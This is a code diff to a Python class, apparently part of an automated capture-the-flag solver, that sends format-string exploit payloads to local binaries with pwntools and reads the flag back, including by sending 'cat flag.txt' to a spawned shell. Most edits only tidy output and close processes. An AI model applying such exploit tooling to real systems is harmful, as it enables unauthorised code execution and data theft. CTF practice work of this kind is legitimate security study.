@@ -9,6 +9,7 @@ class FMT:
         self.analysis = analysis
         self.filename = analysis.binary
         self.e = ELF(self.filename)
+
     
     def build_exploit(self):
         payload = None
@@ -43,7 +44,8 @@ class FMT:
             start = vals.find("flag")
             end = vals.find("}")
             flag = vals[start:end+1]
-            print(fire + " " + flag.strip("\n") + " " + fire)
+            flag_stripped = flag.strip("\n")
+            fart_print.success(f"{self.filename}: {flag_stripped}")
             return True
         else:
             return False
@@ -60,7 +62,7 @@ class FMT:
 
             p = process(self.filename)
             p.sendline(payload)
-
+        
             self.print_flag(p)
 
     def find_write_prim_offset(self):
@@ -75,7 +77,8 @@ class FMT:
             p.recvuntil(b"<<<")
             if b"0xdeadbeefdeadbeef" in p.recvline():
                 offset = x
-        
+            p.close()
+
         return offset
     
     def get_padding(self, size):
@@ -99,15 +102,17 @@ class FMT:
 
             self.print_flag(p)
 
-    def supporting_functions_here(self):
-        print("example support function")
-
     def print_flag(self, p): 
         if self.analysis.has_catflagtxt():
             p.recvuntil(b"<<<")
             p.recvline()
-            print(fire + " " + p.recvline().decode("utf-8").strip("\n") + " " + fire)
+
+            flag = p.recvline().decode('utf-8').strip('\n')
+            fart_print.success(f"{self.filename}: flag{flag}")
         elif self.analysis.has_binsh():
             p.sendline(b"cat flag.txt")
             p.recvuntil(b"flag")
-            print(fire + " flag" + p.recvline().decode('utf-8').strip("\n") + " " + fire)
+            flag = p.recvline().decode('utf-8').strip('\n')
+            fart_print.success(f"{self.filename}: flag{flag}")
+
+        p.close()
